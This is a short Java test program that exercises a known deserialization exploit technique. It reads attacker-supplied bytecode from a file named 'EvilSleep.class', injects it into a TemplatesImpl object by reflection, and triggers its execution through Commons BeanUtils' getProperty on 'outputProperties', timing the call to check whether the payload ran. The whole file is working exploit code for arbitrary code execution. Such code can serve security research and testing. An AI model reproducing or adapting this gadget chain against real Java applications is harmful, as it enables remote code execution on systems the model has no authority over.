import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.PropertyUtils;
import java.lang.reflect.Field;
import java.nio.file.*;

public class TestProp {
    public static void main(String[] a) throws Exception {
        byte[] evil = Files.readAllBytes(Paths.get("EvilSleep.class"));
        TemplatesImpl tpl = new TemplatesImpl();
        set(tpl, "_bytecodes", new byte[][]{evil});
        set(tpl, "_name", "x");
        long t0 = System.currentTimeMillis();
        try {
            Object r = PropertyUtils.getProperty(tpl, "outputProperties");
            System.out.println("[OK] got: " + r.getClass().getName() + " after " + (System.currentTimeMillis()-t0) + "ms");
        } catch (Throwable t) {
            System.out.println("[FAIL after " + (System.currentTimeMillis()-t0) + "ms]");
            Throwable c = t;
            while (c != null) { System.out.println("  " + c.getClass().getName() + ": " + c.getMessage()); c = c.getCause(); }
        }
    }
    static void set(Object o, String f, Object v) throws Exception {
        Field fd = o.getClass().getDeclaredField(f);
        fd.setAccessible(true);
        fd.set(o, v);
    }
}
